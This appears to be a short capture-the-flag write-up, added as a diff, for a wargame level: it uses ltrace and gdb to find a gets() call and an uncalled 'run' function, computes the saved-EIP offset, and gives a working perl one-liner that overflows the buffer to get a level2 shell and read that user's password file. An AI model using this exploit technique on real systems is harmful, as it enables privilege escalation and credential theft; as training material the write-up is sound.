@@ -1,0 +1,21 @@
+When running ./level1 with ltrace we understand it uses gets() to fill a buffer
+
+In gdb when doint 'info func' we can see a 'run' function never called in the main
+We can try a buffer overflow thanks to gets() and try to rewrite eip value saved on the stack
+
+I used https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ to find where eip pointer is saved :
+
+	(gdb) shell perl -e 'print "Aa0Aa1A[...]1Ad2A"' > /tmp/eipfinder
+	(gdb) run < /tmp/eipfinder
+	[...]
+	0x63413563 in ?? ()
+
+Then outside gdb I use perl to generate a string to overflow buffer and overwrite run's address
+	cat <(perl -e 'print "A"x76 . "\x44\x84\x04\x08"') - | ./level1
+	Good... Wait what?
+	
+	whoami
+	level2
+
+We can now execute commands as level2.
+	cat /home/user/level2/.pass
